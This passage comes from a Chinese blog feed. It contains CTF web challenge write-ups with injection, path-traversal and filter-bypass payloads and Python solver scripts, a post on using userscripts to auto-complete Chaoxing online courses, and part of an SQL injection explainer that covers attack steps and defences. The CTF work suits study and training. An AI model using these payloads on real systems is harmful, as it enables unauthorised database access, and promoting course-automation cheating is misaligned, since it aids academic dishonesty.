<h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><p><a href="http://123.206.31.85:10006/" target="_blank" rel="noopener">http://123.206.31.85:10006/</a></p>
<p>要求本地登陆（X-Forwarded-For:127.0.0.1），然后发现网页最后又一段base64加密值，拿去解密去尝试发现是登陆密码</p>
<h4 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h4><p><a href="http://123.206.31.85:3030" target="_blank" rel="noopener">http://123.206.31.85:3030</a></p>
<p>看到提示robots，进入robots.txt,又提示shell.php文件，再次访问，看到</p>
<p>substr(md5(), 0, 6) = 4b2a33</p>
<p>要求某个值的MD5值的前6位</p>
<h4 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h4><p><a href="http://123.206.31.85:10013/index.php" target="_blank" rel="noopener">http://123.206.31.85:10013/index.php</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3leghmtnj30bw065dfx.jpg" alt="image-20200524155443741"></p>
<p>用BP抓包看看</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3lj012z8j30g10bsdhn.jpg" alt="image-20200524155907811"></p>
<p>发现Password和Hint有点东西，Password去base64解密flag{a2e3bddc52c9b95a56e45a930dc2192c}提交是错误的，然后再看Hint内容后，尝试讲Password解密后传入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3lodalfuj30ea04h0sv.jpg" alt="image-20200524160417927"></p>
<p>推断需要获取Password内容解密后传入才能得到flag，速度要快</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://123.206.31.85:10013/index.php'</span></span><br><span class="line">r = requests.session()</span><br><span class="line">r1 = r.post(url, data = &#123;<span class="string">'password'</span>:<span class="string">'flag'</span>&#125;)</span><br><span class="line">Password = r1.headers[<span class="string">'Password'</span>]</span><br><span class="line">password = str(base64.b64decode(Password), <span class="string">'utf-8'</span>)</span><br><span class="line">print(password)</span><br><span class="line">r2 = r.post(url, data = &#123;<span class="string">'password'</span>:password&#125;)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3ltlsi0yj30fh077jrt.jpg" alt="image-20200524160919443"></p>
<h4 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h4><p>打开下载的日志文件，查看flag发现有sqlmap爆破的内容，发现每一段最后就是%3D后面，–的前面的数值不一样，只是数值，猜是ASCII值</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3m8ogyhvj30i20dwdkc.jpg" alt="image-20200524162348729"></p>
<p>然后把这些相关的内容复制到一个txt文件，用python去提取解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = open(<span class="string">"log.txt"</span>)</span><br><span class="line">line = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">if</span> line != <span class="string">''</span>:</span><br><span class="line">        left = re.search(<span class="string">'%3D'</span>,line).end()</span><br><span class="line">        right = re.search(<span class="string">'--'</span>,line).start()</span><br><span class="line">        print(chr(int(line[left:right])),end=<span class="string">''</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h4 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h4><p><a href="http://123.206.31.85:10018/list.php?id=1" target="_blank" rel="noopener">http://123.206.31.85:10018/list.php?id=1</a></p>
<p>打开页面，单引号报错, –+回显正常</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3n0vw2yhj30k90aamxx.jpg" alt="image-20200524165055480"></p>
<p>然后查询字段，发现怎么查询都不回显，猜测有过滤，采用双写绕过，发现4的时候报错，字段为3</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3n5arhbvj30wc0950ud.jpg" alt="image-20200524165510078"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3n8by3e2j30w10a8mza.jpg" alt="image-20200524165804904"></p>
<p>爆表名，爆列名,爆字段内容</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf3ndevbfij30zb09tgng.jpg" alt="image-20200524170257684"></p>
<h4 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h4><p><a href="http://123.206.31.85:10020/" target="_blank" rel="noopener">http://123.206.31.85:10020/</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5tgdyubmj30if09iq3s.jpg" alt="image-20200526140430294"></p>
<p>将获取到的密文，通过参数key传入，然后获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(src)</span>:</span></span><br><span class="line">    md5str = src</span><br><span class="line">    m1 = hashlib.md5()</span><br><span class="line">    m1.update(md5str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    token = m1.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line">s = requests.session()</span><br><span class="line">urllen = <span class="number">160</span></span><br><span class="line"><span class="keyword">while</span> urllen==<span class="number">160</span>:</span><br><span class="line">    url = <span class="string">'http://123.206.31.85:10020/?key='</span> + str(get_token(str(int(time.time()+<span class="number">1</span>)))) + str(random.randint(<span class="number">0</span>, <span class="number">9</span>))</span><br><span class="line">    html = s.get(url).text</span><br><span class="line">    urllen = len(html)</span><br><span class="line">    print(url)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>





<h4 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h4><p><a href="http://123.206.31.85:10025/" target="_blank" rel="noopener">http://123.206.31.85:10025/</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5u4lazixj30hd08zmxq.jpg" alt="image-20200526142749134"></p>
<p>有一个xiazai可是点击报错</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5u801mxcj30nb0nsgml.jpg" alt="image-20200526143104953"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5u9v5n5vj30ge04574t.jpg" alt="image-20200526143252326"></p>
<p>看到源码，去掉/2试试看，结果发现可以访问</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5uavyzrhj30ev087js0.jpg" alt="image-20200526143351705"></p>
<p>把获取的内容去提交看看，发现不对</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5v3k2qj6j30gy05ymxo.jpg" alt="image-20200526143523605"></p>
<p>然后没啥思路了，去扫描网站看看</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5u6lfdsyj30lb09xgm2.jpg" alt="image-20200526142944024"></p>
<p>访问shell.php</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5u6zdysfj30ho06s74q.jpg" alt="image-20200526143006544"></p>
<p>把ziidian.txt内容一个一个提交，发现返回flag</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5uf6hpy4j30m809bgm8.jpg" alt="image-20200526143759167"></p>
<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p><a href="http://123.206.31.85:10003/" target="_blank" rel="noopener">http://123.206.31.85:10003/</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5ui753cvj30v70bzq4j.jpg" alt="image-20200526144053113"></p>
<p>图片上传，传个图片马，发现一直没有结果，最后看到op=upload有可能是文件包含</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5ujgrx1ej30v80ac404.jpg" alt="image-20200526144206048"></p>
<p>最后去base64解密下，得到flag</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5uk6o13rj30fm05z756.jpg" alt="image-20200526144247773"></p>
<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p><a href="http://123.206.31.85:10004/index.php" target="_blank" rel="noopener">http://123.206.31.85:10004/index.php</a></p>
<p>打开是登陆界面，登陆后就能看到flag</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5ulu8qhvj30t00bfdgp.jpg" alt="image-20200526144422906"></p>
<p>直接尝试万能用户或者密码</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5umlvl4rj30es089glv.jpg" alt="image-20200526144506344"></p>
<p>直接成功登陆，获得flag</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5umzbw3fj30kg07ydgh.jpg" alt="image-20200526144529067"></p>
<h4 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h4><p><a href="http://123.206.31.85:10008" target="_blank" rel="noopener">http://123.206.31.85:10008</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5uwdlzz4j30uh08ymxs.jpg" alt="image-20200526145430982"></p>
<p>404？？？？，bp抓包看下</p>
<p>hint提示vim 那肯定和vim非正常关闭有关，vim非正常关闭会产生swp</p>
<p>所以<code>http://123.206.31.85:10015/index.php?id=swp&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2#</code> url中id要改为swp，还要把1改为i。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf5uxxteofj30if054dgd.jpg" alt="image-20200526145601111"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>超星刷课</title>
    <url>/2020/05/27/%E8%B6%85%E6%98%9F%E5%88%B7%E8%AF%BE/</url>
    <content><![CDATA[<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>下载Tampermonkey油猴</p>
<p><a href="https://www.tampermonkey.net/" target="_blank" rel="noopener">https://www.tampermonkey.net/</a>        网站下载被墙了，需要代理</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70kyll8zj30vu0hzju8.jpg" alt="image-20200527145641946"></p>
<p>还有一种办法，去pc6网站下载</p>
<p><a href="http://www.pc6.com/soft/FireFox_247376.html" target="_blank" rel="noopener">http://www.pc6.com/soft/FireFox_247376.html</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70kkzfooj30rs0k8n10.jpg" alt="image-20200527145620098"></p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>然后通过下载的crx包直接托放进Chrome</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70jloe5fj30m70faq69.jpg" alt="image-20200527145523738"></p>
<p>然后打开开发者模式，把下载的解压包直接拖拽到空白地方，就安装好了</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70lmk1jsj313z0i2n0t.jpg" alt="image-20200527145720487"></p>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><a href="https://greasyfork.org/zh-CN/scripts" target="_blank" rel="noopener">https://greasyfork.org/zh-CN/scripts</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70mke602j30zw0iwdli.jpg" alt="image-20200527145814361"></p>
<p>去下载适合的脚本进行安装</p>
<p>最后附上结果图</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70ogpwatj30xm0l3jye.jpg" alt="image-20200527150004255"></p>
<p>然后就是愉快刷课，但是小心被发现，自行负责，仅供参考</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf70q2rdslj306v06c758.jpg" alt="image-20200527150136822"></p>
]]></content>
  </entry>
  <entry>
    <title>记录BUUCTF平台web题目（一）</title>
    <url>/2020/05/28/BUUCTF%E5%B9%B3%E5%8F%B0web/</url>
    <content><![CDATA[<h3 id="HCTF-2018——WarmUp"><a href="#HCTF-2018——WarmUp" class="headerlink" title="HCTF-2018——WarmUp"></a>HCTF-2018——WarmUp</h3><p>打开页面F12发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--source.php--&gt;</span><br></pre></td></tr></table></figure>

<p>访问这个页面，给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现还有一个页面 [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”]</p>
<p>然后访问发现</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf86zvccimj30mb03vt99.jpg" alt="image-20200528152408725"></p>
<p>然后又源码审计发现，截取有问题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br></pre></td></tr></table></figure>

<p>然后就构造url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf874czjcwj30lp04k3z4.jpg" alt="image-20200528152830317"></p>
<h3 id="强网杯-2019——随便注"><a href="#强网杯-2019——随便注" class="headerlink" title="强网杯-2019——随便注"></a>强网杯-2019——随便注</h3><p>打开页面是简单的sql注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf87g3fdffj30qw076mxv.jpg" alt="image-20200528153946778"></p>
<p>发现过滤</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf87gxml1gj30lt049t8y.jpg" alt="image-20200528154035153"></p>
<p>使用堆叠查询</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf87jviy3zj30c209dmxn.jpg" alt="image-20200528154324832"></p>
<p>然后使用-1’;show columns from <code>1919810931114514</code>#</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf87nyyjg2j30f408uaai.jpg" alt="image-20200528154720885"></p>
<p>查询数据，因为过滤了select，使用预编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set用于设置变量名和值</span><br><span class="line">prepare用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;;set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);prepare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br><span class="line">拆分开来如下</span><br><span class="line">-1&#39;;</span><br><span class="line">set @sql &#x3D; CONCAT(&#39;se&#39;,&#39;lect * from &#96;1919810931114514&#96;;&#39;);</span><br><span class="line">prepare stmt from @sql;</span><br><span class="line">EXECUTE stmt;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf87sbbyc7j30gs04at8w.jpg" alt="image-20200528155131236"></p>
<p>检测到关键吃，大小写绕过</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf87syegmrj30fd04wglr.jpg" alt="image-20200528155208284"></p>
<p>直接上sqlmap更简单</p>
<h3 id="Suctf-2019-easysql"><a href="#Suctf-2019-easysql" class="headerlink" title="Suctf 2019 easysql"></a>Suctf 2019 easysql</h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfaiecjmcpj30dz042glp.jpg" alt="image-20200530152946518"></p>
<p>堆叠查询，1;show databases;</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfaif1efupj311b02vaai.jpg" alt="image-20200530153029326"></p>
<p>然后又做了好久没办法查询flag，去找wp发现，有源码泄漏，然后没有过滤*号，就导致</p>
<p>输入*,1    就可以得到flag</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfaig3j8p8j30he03vq38.jpg" alt="image-20200530153130264"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入与sqlmap</title>
    <url>/2020/06/10/sql%E6%B3%A8%E5%85%A5%E4%B8%8Esqlmap/</url>
    <content><![CDATA[<h2 id="一、了解sql注入"><a href="#一、了解sql注入" class="headerlink" title="一、了解sql注入"></a>一、了解sql注入</h2><ol>
<li><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>​        SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
</li>
<li><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>​        SQL注入攻击是通过操作输入来修改SQL语句，用以达到执行代码对WEB服务器进行攻击的方法。简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。</p>
</li>
<li><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>​        SQL是操作<a href="https://baike.baidu.com/item/数据库/103728" target="_blank" rel="noopener">数据库</a>数据的结构化查询语言，网页的应用数据和后台数据库中的数据进行交互时会采用SQL。而SQL注入是将Web页面的原<a href="https://baike.baidu.com/item/URL/110640" target="_blank" rel="noopener">URL</a>、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。如Web应用程序的开发人员对用户所输入的数据或cookie等内容不进行过滤或验证(即存在注入点)就直接传输给数据库，就可能导致拼接的SQL被执行，获取对数据库的信息以及提权，发生SQL注入攻击。</p>
</li>
<li><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol>
<li>广泛性</li>
<li>隐蔽性</li>
<li>危害大</li>
<li>操作方便</li>
</ol>
</li>
<li><h4 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4><ol>
<li>第一步：SQL注入点探测。探测SQL注入点是关键的一步，通过适当的分析应用程序，可以判断什么地方存在SQL注入点。通常只要带有输入提交的动态网页，并且动态网页访问数据库，就可能存在SQL注入漏洞。如果程序员信息安全意识不强，采用动态构造SQL语句访问数据库，并且对用户的输入未进行有效性验证，则存在SQL注入漏洞的可能性很大。一般通过页面的报错信息来确定是否存在SQL注入漏洞。</li>
<li>第二步：收集后台数据库信息。不同数据库的注入方法、函数都不尽相同，因此在注入之前，我们先要判断一下数据库的类型。判断数据库类型的方法很多，可以输入特殊字符，如单引号，让程序返回错误信息，我们根据错误信息提示进行判断；还可以使用特定函数来判断，比如输入“1 and version（）&gt;0”，程序返回正常，说明version（）函数被数据库识别并执行，而version（）函数是MySQL特有的函数，因此可以推断后台数据库为MySQL。</li>
<li>第三步：猜解用户名和密码。数据库中的表和字段命名一般都是有规律的。通过构造特殊SQL语句在数据库中依次猜解出表名、字段名、字段数、用户名和密码。</li>
<li>第四步：查找Web后台管理入口。WEB后台管理通常不对普通用户开放，要找到后台管理的登录网址，可以利用Web目录扫描工具（如：wwwscan、AWVS）快速搜索到可能的登录地址，然后逐一尝试，便可以找到后台管理平台的登录网址。</li>
<li>第五步：入侵和破坏。一般后台管理具有较高权限和较多的功能，使用前面已破译的用户名、密码成功登录后台管理平台后，就可以任意进行破坏，比如上传<a href="https://baike.baidu.com/item/木马/530" target="_blank" rel="noopener">木马</a>、篡改网页、修改和窃取信息等，还可以进一步提权，入侵Web服务器和数据库服务器。</li>
</ol>
</li>
<li><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><ol>
<li><h5 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h5><p>​       当输入的参数为整型时，如ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入。这种数字型注入最多出现在ASP、PHP等弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1，则会推导为string类型，这是弱类型语言的特性。而对于Java、C#这类强类型语言，如果试图把一个字符串转换为int类型，则会抛出异常，无法继续执行。所以，强类型的语言很少存在数字型注入漏洞。</p>
</li>
<li><h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>​        当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>
</li>
</ol>
</li>
<li><h4 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h4><ol>
<li><h5 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h5><p>​        因为web的页面返回值都是True或者False，所以布尔盲注就是注入后根据页面返回值来得到数据库信息的一种办法。</p>
</li>
<li><h5 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h5><p>​        当布尔型注入没有结果（页面显示正常）的时候，我们很难判断注入的代码是否被执行，也可以说到底这个注入点存不存在？这个时候布尔型注入就无法发挥自己的作用了。基于时间的盲注便应运而生，所谓基于时间的盲注，就是我们根据web页面相应的时间差来判断该页面是否存在SQL注入点。</p>
</li>
<li><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>​        使用联合查询进行注入的前提是我们要进行注入的页面必须有显示位。所谓联合查询注入即是使用union合并两个或多个SELECT语句的结果集，所以两个及以上的select必须有相同列、且各列的数据类型也都相同。联合查询注入可在链接最后添加order by 9基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。</p>
</li>
<li><h5 id="基于错误信息的注入"><a href="#基于错误信息的注入" class="headerlink" title="基于错误信息的注入"></a>基于错误信息的注入</h5><p>​        此方法是在页面没有显示位，但是echo mysql_error();函数输出了错误信息的时候方能使用。优点是注入速度快，缺点是语句较为复杂，而且只能用limit依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用echo mysql_error();输出了错误信息时使用。</p>
</li>
</ol>
</li>
<li><h4 id="注入防范措施"><a href="#注入防范措施" class="headerlink" title="注入防范措施"></a>注入防范措施</h4><ol>
<li><h5 id="分级管理"><a href="#分级管理" class="headerlink" title="分级管理"></a>分级管理</h5><p>​        对用户进行分级管理，严格控制用户的权限，对于普通用户，禁止给予数据库建立、删除、修改等相关权限，只有系统管理员才具有增、删、改、查的权限。例如上述实例中用户在查询语句中加入了drop table。肯定是不能让其执行的，否则系统的数据库安全性就无法保障。故而通过权限的设计限制。使得即使恶意攻击者在数据提交时嵌入了相关攻击代码。但因为设置了权限，从而使得代码不能执行。从而减少SQL注入对数据库的安全威胁。</p>
</li>
<li><h5 id="参数传值"><a href="#参数传值" class="headerlink" title="参数传值"></a>参数传值</h5><p>​        程序员在书写SQL语言时，禁止将变量直接写入到SQL语句，必须通过设置相应的参数来传递相关的变量。从而抑制SQL注入。数据输入不能直接嵌入到查询语句中。同时要过滤输入的内容，过滤掉不安全的输入数据。或者采用参数传值的方式传递输入变量。这样可以最大程度防范SQL注入攻击。</p>
</li>
<li><h5 id="基础过滤与二次过滤"><a href="#基础过滤与二次过滤" class="headerlink" title="基础过滤与二次过滤"></a>基础过滤与二次过滤</h5><p>​        SQL注入攻击前，入侵者通过修改参数提交“and”等特殊字符，判断是否存在漏洞，然后通过select、update等各种字符编写SQL注入语句。因此防范SQL注入要对用户输入进行检查，确保数据输入的安全性，在具体检查输入或提交的变量时，对于单引号、双引号、冒号等字符进行转换或者过滤，从而有效防止SQL注入。当然危险字符有很多，在获取用户输入提交的参数时，首先要进行基础过滤，然后根据程序的功能及用户输入的可能性进行二次过滤，以确保系统的安全性。</p>
</li>
<li><h5 id="使用安全参数"><a href="#使用安全参数" class="headerlink" title="使用安全参数"></a>使用安全参数</h5><p>​        SQL数据库为了有效抑制SQL注入攻击的影响。在进行SQLServer数据库设计时设置了专门的SQL安全参数。在程序编写时应尽量使用安全参数来杜绝注入式攻击。从而确保系统的安全性。</p>
</li>
<li><h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>​        为了更有效地防范SQL注入攻击，作为系统管理除了设置有效的防范措施，更应该及时发现系统存在SQL攻击安全漏洞。系统管理员可以通过采购一些专门系统的SQL漏洞扫描工具，通过专业的扫描工具，可以及时的扫描到系统存在的相应漏洞。虽然漏洞扫描工具只能扫描到SQL注入漏洞，不能防范SQL注入攻击。但系统管理员可以通过扫描到的安全漏洞，根据不同的情况采取相应的防范措施封堵相应的漏洞，从而把SQL注入攻击的门给关上，从而确保系统的安全。</p>
</li>
<li><h5 id="多层验证"><a href="#多层验证" class="headerlink" title="多层验证"></a>多层验证</h5><p>​        现在的网站系统功能越来越庞大复杂。为确保系统的安全，访问者的数据输入必须经过严格的验证才能进入系统，验证没通过的输入直接被拒绝访问数据库，并且向上层系统发出错误提示信息。同时在客户端访问程序中验证访问者的相关输入信息，从而更有效的防止简单的SQL注入。但是如果多层验证中的下层如果验证数据通过，那么绕过客户端的攻击者就能够随意访问系统。因此在进行多层验证时，要每个层次相互配合，只有在客户端和系统端都进行有效的验证防护，才能更好地防范SQL注入攻击。</p>
</li>
<li><h5 id="数据库信息加密"><a href="#数据库信息加密" class="headerlink" title="数据库信息加密"></a>数据库信息加密</h5><ol>
<li>对称加密：即加密方和解密方都使用相同的加密算法和密钥，这种方案的密钥的保存非常关键，因为算法是公开的，而密钥是保密的，一旦密匙泄露，黑客仍然可以轻易解密。常见的对称加密算法有：AES、DES等。</li>
<li>非对称加密：即使用不同的密钥来进行加解密，密钥被分为公钥和私钥，用私钥加密的数据必须使用公钥来解密，同样用公钥加密的数据必须用对应的私钥来解密，常见的非对称加密算法有：RSA等。</li>
<li>不可逆加密：利用哈希算法使数据加密之后无法解密回原数据，这样的哈希算法常用的有：md5、SHA-1等。</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 id="二、了解sqlmap"><a href="#二、了解sqlmap" class="headerlink" title="二、了解sqlmap"></a>二、了解sqlmap</h2><ol>
